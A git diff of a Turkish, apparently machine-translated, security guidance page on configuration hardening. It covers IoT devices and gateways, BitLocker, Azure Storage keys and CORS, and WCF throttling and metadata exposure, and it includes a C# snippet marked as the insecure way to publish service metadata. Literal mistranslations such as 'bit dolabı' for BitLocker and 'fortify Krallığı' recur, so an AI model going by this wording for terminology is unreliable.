 | ----------------------- | ------------ |
-| **Bileşen**               | IoT Cihazı | 
-| **SDL Fazı**               | Dağıtım |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **Bileşen**               | IoT cihazı | 
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | Yok  |
-| **Adımlar** | İşletim sistemi içinde çözümün çalışması için gerekli olmayan özellikleri veya hizmetleri etkinleştirmeyin veya kapatmayın. Örneğin, aygıtın bir UI'nin dağıtılmasını gerektirmediği için, Windows IoT Core'u başsız modda yükleyin. |
+| **Adımlar** | Windows 10 IoT Core, gerekli ölçümleri destekleyen UEFı 'de gerekli olan preOS protokolü de dahil olmak üzere, platformda bir TPM 'nin varlığına yönelik güçlü bir bağımlılığı olan bit-dolabı cihaz şifrelemesinin hafif bir sürümünü uygular. Bu ön Işletim sistemi ölçümleri, işletim sisteminin daha sonra işletim sisteminin nasıl başlatılmakta olan kesin bir kaydına sahip olduğundan emin olun. Bit dolabı ve herhangi bir hassas veriyi depolarsa ek bölümleri kullanarak işletim sistemi bölümlerini şifreleyin. |
 
-## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>IoT Field Gateway'in işletim sistemi ve ek bölümlerini bit dolabı yla şifreleme
+## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Cihazlarda yalnızca en düşük hizmet/özelliklerin etkinleştirildiğinden emin olun
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
-| **Bileşen**               | IoT Alan Ağ Geçidi | 
-| **SDL Fazı**               | Dağıtım |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **Bileşen**               | IoT cihazı | 
+| **SDL aşaması**               | Dağıtım |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | Yok  |
-| **Adımlar** | Windows 10 IoT Core, gerekli ölçümleri gerçekleştiren UEFI'de gerekli preOS protokolü de dahil olmak üzere platformda bir TPM varlığına güçlü bir bağımlılığa sahip bit dolabı Aygıt Şifrelemesinin hafif bir sürümünü uygular. Bu preOS ölçümleri, işletim sistemi daha sonra işletim sistemi başlatıldı nasıl kesin bir kayıt olmasını sağlar. Bit dolabı nı ve herhangi bir ek bölümü kullanarak işletim sistemi bölümlerini şifreleyin, ayrıca hassas verileri depolamaları durumunda. |
+| **Adımlar** | İşletim sisteminde çözümün çalışması için gerekli olmayan tüm özellikleri veya hizmetleri etkinleştirmeyin veya devre dışı bırakın. Örneğin, cihaz için bir UI dağıtımı gerektirmiyorsa, Windows IoT Core 'u gözetimsiz modda yüklersiniz. |
 
-## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Yükleme sırasında alan ağ geçidinin varsayılan oturum açma kimlik bilgilerinin değiştirildiğinden emin olun
+## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Bit dolabı ile işletim sistemi ve IoT alan ağ geçidinin ek bölümlerini şifreleme
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
-| **Bileşen**               | IoT Alan Ağ Geçidi | 
-| **SDL Fazı**               | Dağıtım |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **Bileşen**               | IoT alan ağ geçidi | 
+| **SDL aşaması**               | Dağıtım |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | Yok  |
-| **Adımlar** | Yükleme sırasında alan ağ geçidinin varsayılan oturum açma kimlik bilgilerinin değiştirildiğinden emin olun |
+| **Adımlar** | Windows 10 IoT Core, gerekli ölçümleri destekleyen UEFı 'de gerekli olan preOS protokolü de dahil olmak üzere, platformda bir TPM 'nin varlığına yönelik güçlü bir bağımlılığı olan bit-dolabı cihaz şifrelemesinin hafif bir sürümünü uygular. Bu ön Işletim sistemi ölçümleri, işletim sisteminin daha sonra işletim sisteminin nasıl başlatılmakta olan kesin bir kaydına sahip olduğundan emin olun. Bit dolabı ve herhangi bir hassas veriyi depolarsa ek bölümleri kullanarak işletim sistemi bölümlerini şifreleyin. |
 
-## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Bulut Ağ Geçidi'nin bağlı aygıtları güncel tutmak için bir işlem uyguladığından emin olun
-
-| Başlık                   | Ayrıntılar      |
-| ----------------------- | ------------ |
-| **Bileşen**               | IoT Bulut Ağ Geçidi | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Genel |
-| **Öznitelikler**              | Ağ geçidi seçimi - Azure IoT Hub |
-| **Başvurular**              | [IoT Hub Cihaz Yönetimi Genel Bakış](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), Aygıt [Firmware nasıl güncellenir](../../iot-hub/tutorial-firmware-update.md) |
-| **Adımlar** | LWM2M, Open Mobile Alliance for IoT Cihaz Yönetimi için bir protokoldür. Azure IoT aygıt yönetimi, aygıt işlerini kullanarak fiziksel aygıtlarla etkileşime girmenize olanak tanır. Azure IoT Hub Aygıt Yönetimi'ni kullanarak Bulut Ağ Geçidi'nin aygıtı ve diğer yapılandırma verilerini düzenli olarak güncel tutmak için bir işlem uyguladığından emin olun. |
-
-## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Aygıtların kuruluş ilkelerine göre yapılandırılan son nokta güvenlik denetimlerine sahip olduğundan emin olun
+## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Alan ağ geçidinin varsayılan oturum açma kimlik bilgilerinin yükleme sırasında değiştirildiğinden emin olun
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
-| **Bileşen**               | Makine Güven Sınırı | 
-| **SDL Fazı**               | Dağıtım |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **Bileşen**               | IoT alan ağ geçidi | 
+| **SDL aşaması**               | Dağıtım |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | Yok  |
-| **Adımlar** | Aygıtların disk düzeyinde şifreleme için bit dolabı, güncelleştirilmiş imzalara sahip virüsten koruma, ana bilgisayar tabanlı güvenlik duvarı, işletim sistemi yükseltmeleri, grup ilkeleri vb. gibi son nokta güvenlik denetimlerine sahip olduğundan emin olun, kuruluş güvenlik ilkelerine göre yapılandırılır. |
+| **Adımlar** | Alan ağ geçidinin varsayılan oturum açma kimlik bilgilerinin yükleme sırasında değiştirildiğinden emin olun |
 
-## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Azure depolama erişim anahtarlarının güvenli yönetimini sağlayın
+## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Bulut ağ geçidinin bağlı cihazlar belleniminin güncel tutulması için bir işlem uyguladığından emin olun
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
-| **Bileşen**               | Azure Depolama | 
-| **SDL Fazı**               | Dağıtım |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **Bileşen**               | IoT bulut ağ geçidi | 
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Genel |
+| **Öznitelikler**              | Ağ Geçidi seçimi-Azure IoT Hub |
+| **Başvurular**              | [Cihaz yönetimine genel bakış IoT Hub](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/) [cihaz üretici yazılımını güncelleştirme](../../iot-hub/tutorial-firmware-update.md) |
+| **Adımlar** | LWM2M, IoT cihaz yönetimi için Open Mobile Alliance 'dan bir protokoldür. Azure IoT cihaz yönetimi, cihaz işlerini kullanarak fiziksel cihazlarla etkileşime geçmesini sağlar. Bulut ağ geçidinin, Azure IoT Hub cihaz yönetimi 'ni kullanarak cihazı ve diğer yapılandırma verilerini düzenli olarak güncel tutmasına yönelik bir işlem uyguladığından emin olun. |
+
+## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Cihazların kuruluş ilkelerine göre yapılandırılmış uç nokta güvenlik denetimlerine sahip olduğundan emin olun
+
+| Başlık                   | Ayrıntılar      |
+| ----------------------- | ------------ |
+| **Bileşen**               | Makine güven sınırı | 
+| **SDL aşaması**               | Dağıtım |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
-| **Başvurular**              | [Azure Depolama güvenlik kılavuzu - Depolama Hesabı Anahtarlarınızı Yönetme](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
-| **Adımlar** | <p>Anahtar Depolama: Azure Depolama erişim anahtarlarını Azure Anahtar Kasası'nda gizli olarak saklamanız ve uygulamaların anahtarı anahtar kasasından alması önerilir. Bu, aşağıdaki nedenlerden dolayı önerilir:</p><ul><li>Uygulama, belirli bir izin olmadan anahtarlara erişen birinin bu bulvarını kaldıran bir yapılandırma dosyasında depolama anahtarının kodlanmasına asla gerek duymaz.</li><li>Anahtarlara erişim Azure Active Directory kullanılarak denetlenebilir. Bu, bir hesap sahibinin Anahtarları Azure Anahtar Kasasından alması gereken bir avuç uygulamaya erişim izni verebileceği anlamına gelir. Diğer uygulamalar, özellikle izin vermeden anahtarlara erişemez.</li><li>Anahtar Yenileme: Güvenlik nedenleriyle Azure depolama erişim anahtarlarını yeniden oluşturmak için bir işlemin olması önerilir. Önemli rejenerasyon un neden ve nasıl planlanacak ile ilgili ayrıntıları Azure Depolama Güvenliği Kılavuzu başvuru makalesinde belgelenmiştir</li></ul>|
+| **Başvurular**              | Yok  |
+| **Adımlar** | Cihazların disk düzeyinde şifreleme için bit-dolap gibi uç nokta güvenlik denetimlerine sahip olduğundan emin olun, güncelleştirilmiş imzalar ile virüsten koruma, ana bilgisayar tabanlı güvenlik duvarı, işletim sistemi yükseltmeleri, Grup ilkeleri vb., kuruluş güvenlik ilkelerine göre yapılandırılır. |
 
-## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Azure depolama da CORS etkinse yalnızca güvenilen kökenlere izin verildiğini sağlayın
+## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Azure depolama erişim anahtarlarının güvenli yönetimi sağlama
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
-| **Bileşen**               | Azure Depolama | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **Bileşen**               | Azure Storage | 
+| **SDL aşaması**               | Dağıtım |  
+| **İlgili teknolojiler** | Genel |
+| **Öznitelikler**              | Yok  |
+| **Başvurular**              | [Azure depolama Güvenlik Kılavuzu-depolama hesabı anahtarlarınızı yönetme](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
+| **Adımlar** | <p>Anahtar depolama: Azure depolama erişim anahtarlarını Azure Key Vault bir gizli dizi olarak depolamanız ve uygulamaların anahtar kasasından anahtarı alması önerilir. Aşağıdaki nedenlerden dolayı bu önerilir:</p><ul><li>Uygulamanın bir yapılandırma dosyasında depolama anahtarı sabit kodlanmış olmaz ve bu, başka bir kişinin belirli bir izni olmadan anahtarlara erişim elde etmeme özelliğini kaldırır</li><li>Anahtarlara erişim, Azure Active Directory kullanılarak denetlenebilir. Bu, bir hesap sahibinin Azure Key Vault anahtarları alması gereken el ile uygulamalara erişim sağlayabileceği anlamına gelir. Diğer uygulamalar özel olarak izin vermeden anahtarlara erişemeyecek</li><li>Anahtar yeniden oluşturma: güvenlik nedenleriyle Azure depolama erişim anahtarlarını yeniden oluşturmak için bir işlem yapmanız önerilir. Anahtar yeniden oluşturma planının neden ve nasıl planlanacağı hakkındaki ayrıntılar, Azure depolama Güvenlik Kılavuzu başvuru makalesinde belgelenmiştir</li></ul>|
+
+## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>CORS 'nin Azure depolamada etkin olması durumunda yalnızca güvenilir kaynaklardan izin verildiğinden emin olun
+
+| Başlık                   | Ayrıntılar      |
+| ----------------------- | ------------ |
+| **Bileşen**               | Azure Storage | 
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [Azure Depolama Hizmetleri için CORS Desteği](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
-| **Adımlar** | Azure Depolama, CORS – Çapraz Kaynak Paylaşımı'nı etkinleştirmenizi sağlar. Her depolama hesabı için, bu depolama hesabındaki kaynaklara erişebilecek etki alanlarını belirtebilirsiniz. Varsayılan olarak, CORS tüm hizmetlerde devre dışı bırakılır. Hizmet ilkelerini ayarlamak için yöntemlerden birini çağırmak için REST API veya depolama istemcikitaplığını kullanarak CORS'leri etkinleştirebilirsiniz. |
+| **Adımlar** | Azure depolama, CORS-Cross-Origin kaynak paylaşımını etkinleştirmenizi sağlar. Her depolama hesabı için, bu depolama hesabındaki kaynaklara erişebilen etki alanlarını belirtebilirsiniz. Varsayılan olarak, CORS tüm hizmetlerde devre dışıdır. Hizmet ilkelerini ayarlamak için yöntemlerden birini çağırmak üzere REST API veya depolama istemci kitaplığını kullanarak CORS 'yi etkinleştirebilirsiniz. |
 
-## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>WCF'nin hizmet azaltma özelliğini etkinleştirme
+## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>WCF 'nin hizmet azaltma özelliğini etkinleştir
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | WCF | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | .NET Çerçeve 3 |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | .NET Framework 3 |
 | **Öznitelikler**              | Yok  |
-| **Başvurular**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Türkiye](https://vulncat.fortify.com) |
-| **Adımlar** | <p>Sistem kaynaklarının kullanımına bir sınır koymamak kaynak tükenmesi ve nihayetinde hizmet reddi ile sonuçlanabilir.</p><ul><li>**AÇIKLAMA:** Windows Communication Foundation (WCF), hizmet isteklerini azaltma olanağı sunar. Çok fazla istemci isteğine izin vermek, bir sistemi su basabilir ve kaynaklarını tüketebilir. Diğer taraftan, bir hizmete yalnızca az sayıda istek isteğine izin vermek, yasal kullanıcıların hizmeti kullanmasını engelleyebilir. Her hizmet, uygun miktarda kaynağa izin verecek şekilde ayrı ayrı ayarlanmalıdır ve yapılandırılmalıdır.</li><li>**ÖNERİLER** WCF'nin hizmet azaltma özelliğini etkinleştirin ve uygulamanız için uygun sınırlar belirleyin.</li></ul>|
+| **Başvurular**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [fortify Krallığı](https://vulncat.fortify.com) |
+| **Adımlar** | <p>Sistem kaynaklarının kullanımı için bir sınır yerleştirmemeye, kaynak tükenmesi ve son olarak bir hizmet reddine neden olabilir.</p><ul><li>**Açıklama:** Windows Communication Foundation (WCF), hizmet isteklerini kısıtlama özelliği sunar. İstemci isteklerinin çok fazla olması, bir sistemi ve kaynaklarını tüketmesine izin verir. Öte yandan, bir hizmete yalnızca küçük sayıda isteğin izin verilmesi meşru kullanıcıların hizmeti kullanmasını engelleyebilir. Her hizmetin, uygun kaynak miktarına izin verecek şekilde ayrı ayrı ayarlanmış ve yapılandırılmış olması gerekir.</li><li>**Öneriler** WCF 'nin hizmet azaltma özelliğini etkinleştirin ve uygulamanız için uygun sınırları ayarlayın.</li></ul>|
 
 ### <a name="example"></a>Örnek
-Aşağıda, azaltma etkinleştirilmiş örnek bir yapılandırma verilmiştir:
+Aşağıda, azaltma etkin olan bir örnek yapılandırma verilmiştir:
 ```
 <system.serviceModel> 
   <behaviors>
@@ -623,29 +623,29 @@ Aşağıda, azaltma etkinleştirilmiş örnek bir yapılandırma verilmiştir:
 </system.serviceModel> 
 ```
 
-## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>Meta veriler aracılığıyla WCF-Bilgi açıklaması
+## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>WCF-meta veriler aracılığıyla bilgilerin açıklanması
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | WCF | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | .NET Çerçeve 3 |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | .NET Framework 3 |
 | **Öznitelikler**              | Yok  |
-| **Başvurular**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Türkiye](https://vulncat.fortify.com) |
-| **Adımlar** | Meta veriler, saldırganların sistem hakkında bilgi edinmelerine ve bir saldırı biçimi planlamalarına yardımcı olabilir. WCF hizmetleri meta verileri ortaya çıkarmak için yapılandırılabilir. Meta veriler ayrıntılı hizmet tanımı bilgileri verir ve üretim ortamlarında yayınlanmamalıdır. ServiceMetaData sınıfının özellikleri, `HttpGetEnabled`  /  `HttpsGetEnabled` bir hizmetin meta verileri ortaya çıkarıp göstermeyeceğini tanımlar | 
+| **Başvurular**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [fortify Krallığı](https://vulncat.fortify.com) |
+| **Adımlar** | Meta veriler, saldırganların sistem hakkında bilgi edinme ve bir saldırı formu planı konusunda yardımcı olabilir. WCF Hizmetleri meta verileri açığa çıkarmak için yapılandırılabilir. Meta veriler ayrıntılı hizmet açıklaması bilgileri sağlar ve üretim ortamlarında yayınlanmamalıdır. ServiceMetadata sınıfının `HttpsGetEnabled` özellikleri, bir hizmetin meta verileri kullanıma sunmayacağını tanımlar `HttpGetEnabled`  /  | 
 
 ### <a name="example"></a>Örnek
-Aşağıdaki kod, WCF'ye bir hizmetin meta verilerini yayınlamasını emreder
+Aşağıdaki kod, WCF 'nin bir hizmetin meta verilerini yayınmasını sağlar
 ```
 ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
 smb.HttpGetEnabled = true; 
 smb.HttpGetUrl = new Uri(EndPointAddress); 
 Host.Description.Behaviors.Add(smb); 
 ```
-Hizmet meta verilerini üretim ortamında yayınlamayın. ServiceMetaData sınıfının HttpGetEnabled / HttpsGetEnabled özelliklerini yanlış olarak ayarlayın. 
+Hizmet meta verilerini bir üretim ortamında yayımlamayın. ServiceMetaData sınıfının HttpGetEnabled/HttpsGetEnabled özelliklerini false olarak ayarlayın. 
 
 ### <a name="example"></a>Örnek
-Aşağıdaki kod, WCF'ye bir hizmetin meta verilerini yayınlamamasını bildirir. 
+Aşağıdaki kod, WCF 'yi bir hizmetin meta verilerini yayınmamasını sağlar. 
 ```
 ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
 smb.HttpGetEnabled = false; 
